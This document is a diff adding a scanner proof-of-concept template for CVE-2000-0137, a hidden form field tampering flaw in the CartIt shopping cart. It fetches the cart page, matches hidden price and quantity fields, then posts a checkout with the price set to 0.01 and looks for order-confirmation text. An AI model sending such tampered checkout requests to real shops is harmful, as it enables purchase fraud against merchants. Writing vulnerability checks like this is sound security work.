@@ -1,0 +1,60 @@
+[info]
+author = "ave"
+description = "CartIt 购物车主程序在处理订单时未对前端隐藏表单字段进行服务端校验，攻击者可拦截并篡改隐藏字段（如价格、数量、订单标识）修改敏感购买信息。本 PoC 通过抓取购物车页面并提取隐藏表单字段，验证服务端是否接受篡改后的字段值，从而确认存在表单篡改漏洞。"
+id = "POC-AVE-2000-0122"
+name = "CVE-2000-0137 CartIt 购物车隐藏表单字段篡改 PoC"
+severity = "high"
+tags = ["ave-2000-0122"]
+vuln_id = [
+    "CVE-2000-0137",
+    "AVE-2000-0122",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cartit/cart.php"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    'type="hidden"',
+    'name="price"',
+    'name="amount"',
+    'name="item"',
+    'name="order"',
+    'name="quantity"',
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/cartit/checkout.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "item=TEST&quantity=1&price=0.01&orderid=12345"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "order confirmed",
+    "checkout complete",
+    "thank you",
+    "order placed",
+    "your order",
+]
